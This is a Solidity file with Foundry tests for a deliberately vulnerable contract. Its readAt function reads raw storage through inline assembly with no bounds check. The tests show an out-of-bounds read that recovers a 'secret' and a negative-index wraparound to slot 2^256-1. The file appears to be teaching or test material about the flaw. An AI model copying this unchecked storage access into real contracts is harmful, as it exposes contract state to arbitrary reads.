pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Vulnerable contract as provided
contract Vulnerable {
    // Vulnerable state variables: a fixed-size buffer occupying slots 0, 1, 2 and a secret in slot 3
    bytes32[3] public buffer;  // Vulnerability here: no bounds checking
    uint256 public secret;     // Supposed to be secret but can be read

    constructor() {
        buffer[0] = keccak256(abi.encodePacked("A"));
        buffer[1] = keccak256(abi.encodePacked("B"));
        buffer[2] = keccak256(abi.encodePacked("C"));
        secret = 999;
    }

    // Vulnerable function allowing arbitrary storage read
    function readAt(int256 index) public view returns (bytes32 result) {
        assembly {
            // Directly load from storage without index validation
            result := sload(add(buffer.slot, index))
        }
    }
}


contract VulnerableTest is Test {
    Vulnerable vulnerable;

    function setUp() public {
        vulnerable = new Vulnerable();
    }

    // Test the overflow issue: reading beyond the intended array range should allow reading the secret
    function testOverflowReadSecret() public {
        // Reading at index 3 should read slot (buffer.slot + 3) which is the 'secret' variable
        bytes32 result = vulnerable.readAt(3);
        // secret == 999, so the bytes32 value should equal bytes32(uint256(999))
        assertEq(result, bytes32(uint256(999)), "Reading at index 3 did not return the expected secret");
    }

    // Test the underflow issue: reading with a negative index accesses an unintended storage slot
    function testUnderflowReadArbitrarySlot() public {
        // Calculate the storage slot that will be accessed with index -1
        // Since buffer is stored starting at slot 0, index -1 leads to slot (0 - 1) mod 2^256, which is 2^256 - 1.
        bytes32 targetSlot = bytes32(type(uint256).max);

        // Manually store a known value into the slot 2^256 - 1 using cheat code vm.store
        bytes32 expectedValue = bytes32("exploited");
        vm.store(address(vulnerable), targetSlot, expectedValue);

        // Now reading at index -1 should retrieve the value from slot 2^256 - 1
        bytes32 result = vulnerable.readAt(-1);
        assertEq(result, expectedValue, "Reading at index -1 did not return the exploited value");
    }
}
